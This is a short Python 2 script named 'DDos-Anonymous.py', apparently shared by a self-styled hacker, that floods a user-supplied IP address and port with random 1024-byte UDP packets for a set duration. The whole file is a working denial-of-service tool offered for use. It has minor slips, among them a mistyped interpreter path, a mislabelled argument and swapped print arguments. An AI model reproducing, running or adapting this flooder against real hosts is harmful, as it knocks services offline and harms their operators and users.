#!/use/bin/python2
#code by mohamed hacker
#you tube:- https://www.youtube.com/channel/UCs2SEh8YKE0bBsd0s986iXw
#cp -a DDos-Anonymous.py /data/data/com.termux/files/usr/bin
import time
import socket
import random
import sys
import os
def usage():
    os.system("figlet Anonymous")
    print "		Code By Mohamed-HaCkeR"
    print '''
    use :
        python2 DDos-Anonymous.py <ip> <port> <packet>
    ex  :
        python2 DDos-Anonymous.py 172.0.0.1 80 3000 '''

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attacking  %s sent packages %s at the port %s "%(sent, victim, vport)

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

